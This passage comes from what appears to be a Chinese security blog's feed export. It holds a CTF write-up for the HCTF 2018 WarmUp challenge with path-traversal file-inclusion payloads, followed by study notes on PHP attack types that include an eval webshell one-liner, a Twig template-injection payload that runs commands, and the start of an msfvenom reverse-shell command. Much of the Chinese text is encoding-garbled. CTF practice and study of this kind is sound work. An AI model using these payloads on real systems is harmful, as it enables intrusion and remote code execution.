class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p> é«˜äº®æ˜¾ç¤ºæ–‡ä»¶å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>checkfileå‡½æ•°é‡Œï¼ˆï¼‰ï¼Œæç¤ºæˆ‘ä»¬source.phpå’Œhint.php</p><p>è®¿é—®hint.phpå¾—åˆ°è¯­å¥ï¼š</p><p><strong>flag not here, and flag in ffffllllaaaagggg</strong></p><p>å°†ä¼ é€’çš„å‚æ•°èµ‹å€¼ç»™pageï¼Œç„¶ååˆ¤æ–­è‹¥pageå˜é‡ä¸å­˜åœ¨æˆ–éå­—ç¬¦ä¸²</p><p>åˆ™echo  â€œyou canâ€™t see itâ€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;$_page = mb_substr(</span><br><span class="line">    $page,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‹¥å˜é‡pageå­˜åœ¨äºwhitelistæ•°ç»„ä¸­</p><p>åˆ™è¿”å›true</p><p>ä»¥ä¸‹çœ‹å‡ ä¸ªphpå‡½æ•°ï¼š</p><p>php in_arrayå‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š</p><p>in_array()å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœsearchå‚æ•°æ˜¯å­—ç¬¦ä¸²å¹¶ä¸”è®¾ç½®ä¸ºtrueï¼Œåˆ™æœç´¢åŒºåˆ†å¤§å°å†™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">in_array(search,array,type)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>search</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦åœ¨æ•°ç»„æœç´¢çš„å€¼ã€‚</td></tr><tr><td align="left"><em>array</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æœç´¢çš„æ•°ç»„ã€‚</td></tr><tr><td align="left"><em>type</em></td><td align="left">å¯é€‰ã€‚å¦‚æœè®¾ç½®è¯¥å‚æ•°ä¸º trueï¼Œåˆ™æ£€æŸ¥æœç´¢çš„æ•°æ®ä¸æ•°ç»„çš„å€¼çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</td></tr></tbody></table><p>php mb_substr()å‡½æ•°</p><p>mb_substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ substr() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ mb_substr()ã€‚</p><p><strong>æ³¨é‡Šï¼š</strong>å¦‚æœ start å‚æ•°æ˜¯è´Ÿæ•°ä¸” length å°äºæˆ–ç­‰äº startï¼Œåˆ™ length ä¸º 0ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_substr ( string $str , int $start [, int $length &#x3D; NULL [, string $encoding &#x3D; mb_internal_encoding() ]] ) : string</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>str</em></td><td align="left">å¿…éœ€ã€‚ä»è¯¥ string ä¸­æå–å­å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¿…éœ€ã€‚è§„å®šåœ¨å­—ç¬¦ä¸²çš„ä½•å¤„å¼€å§‹ã€‚æ­£æ•° - åœ¨å­—ç¬¦ä¸²çš„æŒ‡å®šä½ç½®å¼€å§‹è´Ÿæ•° - åœ¨ä»å­—ç¬¦ä¸²ç»“å°¾çš„æŒ‡å®šä½ç½®å¼€å§‹0 - åœ¨å­—ç¬¦ä¸²ä¸­çš„ç¬¬ä¸€ä¸ªå­—ç¬¦å¤„å¼€å§‹</td></tr><tr><td align="left"><em>length</em></td><td align="left">å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚é»˜è®¤æ˜¯ç›´åˆ°å­—ç¬¦ä¸²çš„ç»“å°¾ã€‚æ­£æ•° - ä» start å‚æ•°æ‰€åœ¨çš„ä½ç½®è¿”å›è´Ÿæ•° - ä»å­—ç¬¦ä¸²æœ«ç«¯è¿”å›</td></tr><tr><td align="left">encoding</td><td align="left">å¯é€‰ã€‚å­—ç¬¦ç¼–ç ã€‚å¦‚æœçœç•¥ï¼Œåˆ™ä½¿ç”¨å†…éƒ¨å­—ç¬¦ç¼–ç ã€‚</td></tr></tbody></table><p>php mb_strposå‡½æ•°</p><p>å®šä¹‰å’Œç”¨æ³•ï¼š</p><p>æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><p>åŸºäºå­—ç¬¦æ•°æ‰§è¡Œä¸€ä¸ªå¤šå­—èŠ‚å®‰å…¨çš„strpos()æ“ä½œï¼Œç¬¬ä¸€ä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯0ï¼Œç¬¬äºŒä¸ªå­—ç¬¦çš„ä½ç½®æ˜¯1ï¼Œä¾æ¬¡ç±»æ¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strpos(*string,find,start*)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æè¿°</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚</td></tr><tr><td align="left"><em>find</em></td><td align="left">å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å­—ç¬¦ã€‚</td></tr><tr><td align="left"><em>start</em></td><td align="left">å¯é€‰ã€‚è§„å®šå¼€å§‹æœç´¢çš„ä½ç½®ã€‚</td></tr></tbody></table><p>æˆ‘ä»¬å¤§æ¦‚å°±å¯ä»¥çŸ¥é“äº†ï¼Œè¿™æ®µä»£ç è¡¨ç¤ºæˆªå–$pageä¸­â€™?â€™å‰éƒ¨åˆ†ï¼Œè‹¥æ— åˆ™æˆªå–æ•´ä¸ª$page</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_page = urldecode($page);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å¯¹pageè¿›è¡Œurlè§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆåˆ¤æ–­$_REQUEST[â€˜fileâ€™]å€¼éç©º</p><p>ç¬¬äºŒåˆ¤æ–­æ˜¯å¦ä¸ºå­—ç¬¦ä¸²</p><p>å†å°±æ˜¯èƒ½å¦é€šè¿‡checkfileï¼ˆï¼‰å‡½æ•°æ ¡éªŒ</p><p>åé¢æ˜¯åŒ…å«$_REQUEST[â€˜fileâ€™]æ–‡ä»¶</p><p>å¦‚æœæ¡ä»¶ä¸æ»¡è¶³å°±æ‰“å°æ»‘ç¨½è¡¨æƒ…</p><p>ç»“è®ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.ç¬¬ä¸€ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥å¯¹å˜é‡è¿›è¡Œæ£€éªŒï¼Œè¦æ±‚&#96;&#96;$page&#96;&#96;ä¸ºå­—ç¬¦ä¸²ï¼Œå¦åˆ™è¿”å›false</span><br><span class="line">2.ç¬¬äºŒä¸ª&#96;&#96;if&#96;&#96;è¯­å¥åˆ¤æ–­&#96;&#96;$page&#96;&#96;æ˜¯å¦å­˜åœ¨äº&#96;&#96;$whitelist&#96;&#96;æ•°ç»„ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›true</span><br><span class="line">3.ç¬¬ä¸‰ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥åˆ¤æ–­æˆªå–åçš„&#96;&#96;$page&#96;&#96;æ˜¯å¦å­˜åœ¨äº&#96;&#96;$whitelist&#96;&#96;æ•°ç»„ä¸­ï¼Œæˆªå–&#96;&#96;$page&#96;&#96;ä¸­&#96;&#96;&#39;?&#39;&#96;&#96;å‰éƒ¨åˆ†ï¼Œå­˜åœ¨åˆ™è¿”å›true</span><br><span class="line">4.ç¬¬å››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥åˆ¤æ–­urlè§£ç å¹¶æˆªå–åçš„&#96;&#96;$page&#96;&#96;æ˜¯å¦å­˜åœ¨äº&#96;&#96;$whitelist&#96;&#96;ä¸­ï¼Œå­˜åœ¨åˆ™è¿”å›true</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">è‹¥ä»¥ä¸Šå››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥å‡æœªè¿”å›å€¼ï¼Œåˆ™è¿”å›false</span><br><span class="line">æœ‰ä¸‰ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥å¯ä»¥è¿”å›trueï¼Œç¬¬äºŒä¸ªè¯­å¥ç›´æ¥åˆ¤æ–­&#96;&#96;$page&#96;&#96;ï¼Œä¸å¯ç”¨</span><br><span class="line">ç¬¬ä¸‰ä¸ªè¯­å¥æˆªå–&#96;&#96;&#39;?&#39;&#96;&#96;å‰éƒ¨åˆ†ï¼Œç”±äº?è¢«åéƒ¨åˆ†è¢«è§£æä¸ºgetæ–¹å¼æäº¤çš„å‚æ•°ï¼Œä¹Ÿä¸å¯åˆ©ç”¨</span><br><span class="line">ç¬¬å››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥ä¸­ï¼Œå…ˆè¿›è¡Œurlè§£ç å†æˆªå–ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†?ç»è¿‡ä¸¤æ¬¡urlç¼–ç ï¼Œåœ¨æœåŠ¡å™¨ç«¯æå–å‚æ•°æ—¶è§£ç ä¸€æ¬¡ï¼ŒcheckFileå‡½æ•°ä¸­è§£ç ä¸€æ¬¡ï¼Œä»ä¼šè§£ç ä¸º&#96;&#96;&#39;?&#39;&#96;&#96;ï¼Œä»å¯é€šè¿‡ç¬¬å››ä¸ª&#96;&#96;if&#96;&#96;è¯­å¥æ ¡éªŒã€‚ï¼ˆ&#96;&#96;&#39;?&#39;&#96;&#96;ä¸¤æ¬¡ç¼–ç å€¼ä¸º&#96;&#96;&#39;%253f&#39;&#96;&#96;ï¼‰,æ„é€ urlï¼š</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;hint.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source.php?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p>hint.phpå’Œsource.phpéƒ½æ˜¯ç™½åå•é‡Œæ–‡ä»¶</p><p>å› ä¸ºæˆ‘ä»¬ä¸çŸ¥é“ffffllllaaaaggggæ–‡ä»¶å­˜æ”¾çš„å…·ä½“ä½ç½®<br>æ‰€ä»¥å¯ä»¥ä¾æ¬¡å¢åŠ    ../</p><p>æœ€åæ‹¿åˆ°flag</p><p><img src="/2021/08/29/buu/15/image-20210829101454490.png" alt="image-20210829101454490"></p><p>å€Ÿé‰´äºï¼š</p><p>[<a href="https://www.cnblogs.com/R-S-PY/p/12095264.html">HCTF 2018]WarmUp - AlexANSO - åšå®¢å›­ (cnblogs.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ¸—é€æµ‹è¯•_åŸºç¡€å…¥é—¨_æ¦‚å¿µåè¯</title>
      <link href="/2021/08/27/src/1/"/>
      <url>/2021/08/27/src/1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/weixin_44519789/article/details/114131958">https://blog.csdn.net/weixin_44519789/article/details/114131958</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leak</title>
      <link href="/2021/08/25/src/leak/"/>
      <url>/2021/08/25/src/leak/</url>
      
        <content type="html"><![CDATA[<p>PHPæ¼æ´ä»‹ç»</p><p><a href="https://www.jb51.net/article/31898.htm">https://www.jb51.net/article/31898.htm</a></p><p>é’ˆå¯¹phpç½‘ç«™çš„ä¸»è¦å‡ ç§æ”»å‡»æ–¹å¼</p><h3 id="1-å‘½ä»¤æ³¨å…¥"><a href="#1-å‘½ä»¤æ³¨å…¥" class="headerlink" title="1.å‘½ä»¤æ³¨å…¥"></a>1.å‘½ä»¤æ³¨å…¥</h3><p><a href="https://blog.csdn.net/qq2539879928/article/details/106635907">https://blog.csdn.net/qq2539879928/article/details/106635907</a></p><h3 id="2-evalæ³¨å…¥"><a href="#2-evalæ³¨å…¥" class="headerlink" title="2.evalæ³¨å…¥"></a>2.evalæ³¨å…¥</h3><p>evalå‡½æ•°ï¼Œå¸¸ç”¨ï¼š@eval($_POST[â€˜cmdâ€™])</p><h3 id="3-å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»"><a href="#3-å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»" class="headerlink" title="3.å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»"></a>3.å®¢æˆ·ç«¯è„šæœ¬æ”»å‡»</h3><h3 id="4-è·¨ç½‘ç«™è„šæœ¬æ”»å‡»"><a href="#4-è·¨ç½‘ç«™è„šæœ¬æ”»å‡»" class="headerlink" title="4.è·¨ç½‘ç«™è„šæœ¬æ”»å‡»"></a>4.è·¨ç½‘ç«™è„šæœ¬æ”»å‡»</h3><h3 id="5-sqlæ³¨å…¥æ”»å‡»"><a href="#5-sqlæ³¨å…¥æ”»å‡»" class="headerlink" title="5.sqlæ³¨å…¥æ”»å‡»"></a>5.sqlæ³¨å…¥æ”»å‡»</h3><h3 id="6-è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»"><a href="#6-è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»" class="headerlink" title="6.è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»"></a>6.è·¨ç½‘ç«™è¯·æ±‚ä¼ªé€ æ”»å‡»</h3><p>CSRF</p><h3 id="7-Sessionä¼šè¯åŠ«æŒ"><a href="#7-Sessionä¼šè¯åŠ«æŒ" class="headerlink" title="7.Sessionä¼šè¯åŠ«æŒ"></a>7.Sessionä¼šè¯åŠ«æŒ</h3><h3 id="8-Sessionå›ºå®šæ”»å‡»"><a href="#8-Sessionå›ºå®šæ”»å‡»" class="headerlink" title="8.Sessionå›ºå®šæ”»å‡»"></a>8.Sessionå›ºå®šæ”»å‡»</h3><h3 id="9-HTTPå“åº”æ‹†åˆ†æ”»å‡»"><a href="#9-HTTPå“åº”æ‹†åˆ†æ”»å‡»" class="headerlink" title="9.HTTPå“åº”æ‹†åˆ†æ”»å‡»"></a>9.HTTPå“åº”æ‹†åˆ†æ”»å‡»</h3><h3 id="10-æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#10-æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="10.æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>10.æ–‡ä»¶ä¸Šä¼ æ¼æ´</h3><p><a href="https://blog.csdn.net/weixin_44519789/article/details/116570426">https://blog.csdn.net/weixin_44519789/article/details/116570426</a></p><h3 id="11-ç›®å½•ç©¿è¶Šæ¼æ´"><a href="#11-ç›®å½•ç©¿è¶Šæ¼æ´" class="headerlink" title="11.ç›®å½•ç©¿è¶Šæ¼æ´"></a>11.ç›®å½•ç©¿è¶Šæ¼æ´</h3><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">https://blog.csdn.net/angry_program/article/details/107855078</a></p><h3 id="12-è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»"><a href="#12-è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»" class="headerlink" title="12.è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»"></a>12.è¿œç¨‹æ–‡ä»¶åŒ…å«æ”»å‡»</h3><p><a href="https://blog.csdn.net/qq_45300786/article/details/108724251">https://blog.csdn.net/qq_45300786/article/details/108724251</a></p><h3 id="13-åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»"><a href="#13-åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»" class="headerlink" title="13.åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»"></a>13.åŠ¨æ€æ³¨å…¥å‡½æ•°æ”»å‡»</h3><h3 id="14-URLæ”»å‡»"><a href="#14-URLæ”»å‡»" class="headerlink" title="14.URLæ”»å‡»"></a>14.URLæ”»å‡»</h3><h3 id="15-è¡¨å•æäº¤æ¬ºéª—æ”»å‡»"><a href="#15-è¡¨å•æäº¤æ¬ºéª—æ”»å‡»" class="headerlink" title="15.è¡¨å•æäº¤æ¬ºéª—æ”»å‡»"></a>15.è¡¨å•æäº¤æ¬ºéª—æ”»å‡»</h3><h3 id="16-HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»"><a href="#16-HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»" class="headerlink" title="16.HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»"></a>16.HTTPè¯·æ±‚æ¬ºéª—æ”»å‡»</h3><h3 id="17-æ¨¡æ¿æ³¨å…¥"><a href="#17-æ¨¡æ¿æ³¨å…¥" class="headerlink" title="17.æ¨¡æ¿æ³¨å…¥"></a>17.æ¨¡æ¿æ³¨å…¥</h3><p>(ä»è¿™é‡Œæ‰¾åˆ°äº†å¤§ä½¬åšå®¢ï¼š<a href="https://www.cnblogs.com/bmjoker/">https://www.cnblogs.com/bmjoker/</a>)</p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">https://www.cnblogs.com/bmjoker/p/13508538.html</a></p><p>æ¨¡æ¿å¼•æ“ï¼šè¿™é‡Œç‰¹æŒ‡ç”¨äºWebå¼€å‘çš„æ¨¡æ¿å¼•æ“</p><p>â€‹        å®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„htmlä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”Ÿæˆhtmlä»£ç çš„ç¨‹åºï¼Œç„¶ååªéœ€è¦è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œç„¶åæ”¾åˆ°æ¸²æŸ“å‡½æ•°é‡Œï¼Œç„¶åç”Ÿæˆæ¨¡æ¿+ç”¨æˆ·æ•°æ®çš„å‰ç«¯htmlé¡µé¢ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰</p><p>sstiæ¨¡æ¿æ³¨å…¥</p><p>â€‹                            â€”â€“ä¹Ÿç§°æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨å…¥</p><p>å½“å‰æµè¡Œæ¡†æ¶ï¼Œæ¯”å¦‚pythonçš„flask</p><p>phpçš„tpï¼Œjavaçš„spring</p><h4 id="æ¼æ´æˆå› ï¼š"><a href="#æ¼æ´æˆå› ï¼š" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h4><p>â€‹        æœåŠ¡ç«¯æ¥æ”¶äº†ç”¨æˆ·çš„æ¶æ„è¾“å…¥ä»¥åï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸º Web åº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œæ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯ä»¥ç ´åæ¨¡æ¿çš„è¯­å¥ï¼Œå› è€Œå¯èƒ½å¯¼è‡´äº†æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShell ç­‰é—®é¢˜ã€‚å…¶å½±å“èŒƒå›´ä¸»è¦å–å†³äºæ¨¡ç‰ˆå¼•æ“çš„å¤æ‚æ€§ã€‚</p><p>åˆ©ç”¨å›¾è¡¨</p><p><img src="/2021/08/25/src/leak/1344396-20200911174631687-758048107.png" alt="img"></p><h4 id="Twigæ¨¡æ¿"><a href="#Twigæ¨¡æ¿" class="headerlink" title="Twigæ¨¡æ¿"></a>Twigæ¨¡æ¿</h4><p>ç”±å›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨ç»è¿‡æ¨¡æ¿è§£æåçš„å†…å®¹</p><p><img src="/2021/08/25/src/leak/1344396-20200818195801226-981945295.png" alt="img"></p><p>payloadï¼ˆ2.0ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/08/25/src/leak/1344396-20200818231853350-914354726.png" alt="img"></p><p>æ–‡ç« è¿˜è¯¦ç»†ä»‹ç»äº†ä½¿ç”¨msfé€šè¿‡Twigæ¨¡æ¿æ³¨å…¥è·å–shell</p><p>ä½¿ç”¨msfç”Ÿæˆäº†ä¸€ä¸ªphp meterpreteræœ‰æ•ˆè½½è·</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=<span class="number">192.168</span><span class="number">.127</span><span class="number">.131</span> LPORT=<span class="number">4321</span> &gt; /<span 